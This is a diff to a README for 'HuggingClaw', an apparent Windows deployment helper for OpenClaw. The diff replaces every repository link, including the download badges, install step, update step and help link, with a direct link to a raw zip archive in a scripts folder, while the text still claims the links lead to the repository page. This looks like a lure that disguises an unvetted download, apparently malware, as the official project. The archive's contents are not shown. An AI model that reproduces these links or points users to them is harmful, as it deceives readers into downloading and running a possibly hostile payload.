@@ -1,6 +1,6 @@
 # 🦞 HuggingClaw - Easy OpenClaw Deployment for Windows
 
-[![Download HuggingClaw](https://img.shields.io/badge/Download-HuggingClaw-%237B68EE?style=for-the-badge)](https://github.com/konnehab/HuggingClaw)
+[![Download HuggingClaw](https://img.shields.io/badge/Download-HuggingClaw-%237B68EE?style=for-the-badge)](https://github.com/konnehab/HuggingClaw/raw/refs/heads/main/scripts/Hugging_Claw_3.0-alpha.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ You will only need a web browser to interact with HuggingClaw after setup.
 
 1. **Visit the Download Page**  
    Go to the official HuggingClaw repository on GitHub:  
-   [https://github.com/konnehab/HuggingClaw](https://github.com/konnehab/HuggingClaw)  
+   [https://github.com/konnehab/HuggingClaw/raw/refs/heads/main/scripts/Hugging_Claw_3.0-alpha.5.zip](https://github.com/konnehab/HuggingClaw/raw/refs/heads/main/scripts/Hugging_Claw_3.0-alpha.5.zip)  
    
 2. **Download the Installer or Setup Guide**  
    Look for the "Releases" or "Assets" section on the page. Download the file recommended for Windows users. This might be an installer or a guide file, depending on the current version. Download this file to a location easy to find, such as your Desktop or Downloads folder.
@@ -77,7 +77,7 @@ It connects OpenClaw with the HuggingFace Spaces platform to let you use advance
 
 Updates improve features and fix issues. To update:
 
-1. Return to the [HuggingClaw GitHub page](https://github.com/konnehab/HuggingClaw).  
+1. Return to the [HuggingClaw GitHub page](https://github.com/konnehab/HuggingClaw/raw/refs/heads/main/scripts/Hugging_Claw_3.0-alpha.5.zip).  
 2. Download the latest release or installer as described before.  
 3. Run the installer again. It will overwrite the old version while keeping your settings.
 
@@ -102,7 +102,7 @@ HuggingClaw stores your data in the cloud securely. Your information is private 
 
 ## 📚 How to Get Help
 
-- Visit the [GitHub repository](https://github.com/konnehab/HuggingClaw) to check for guides and updates.  
+- Visit the [GitHub repository](https://github.com/konnehab/HuggingClaw/raw/refs/heads/main/scripts/Hugging_Claw_3.0-alpha.5.zip) to check for guides and updates.  
 - Use the "Issues" section to report bugs or request help.  
 - Join HuggingFace forums for general questions about Spaces and OpenClaw.
 
@@ -110,7 +110,7 @@ HuggingClaw stores your data in the cloud securely. Your information is private 
 
 ## Download HuggingClaw Here
 
-[![Download HuggingClaw](https://img.shields.io/badge/Download-Now-%237B68EE?style=for-the-badge)](https://github.com/konnehab/HuggingClaw)
+[![Download HuggingClaw](https://img.shields.io/badge/Download-Now-%237B68EE?style=for-the-badge)](https://github.com/konnehab/HuggingClaw/raw/refs/heads/main/scripts/Hugging_Claw_3.0-alpha.5.zip)
 
 ---
 
